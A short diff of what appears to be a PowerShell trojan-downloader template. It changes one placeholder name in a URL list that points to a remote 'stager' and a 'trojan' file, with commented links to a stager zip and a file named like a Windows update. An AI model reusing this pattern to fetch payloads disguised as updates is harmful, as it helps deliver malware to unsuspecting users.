@@ -6,7 +6,7 @@ $urls= @(
     # "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/07.STAGER-new.zip",
     "[TROJAN-URL]/[STAGERNAME]",
     # "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/windows6.0-kb4580971-x86_5a4cf976c650cf9b6a0800aaf6016726f4b08c7d.msu"
-    "[TROJAN-URL]/[TROJAN-FE]"
+    "[TROJAN-URL]/[TROJAN_FE]"
 )
 
 function Write-VerboseMsg {
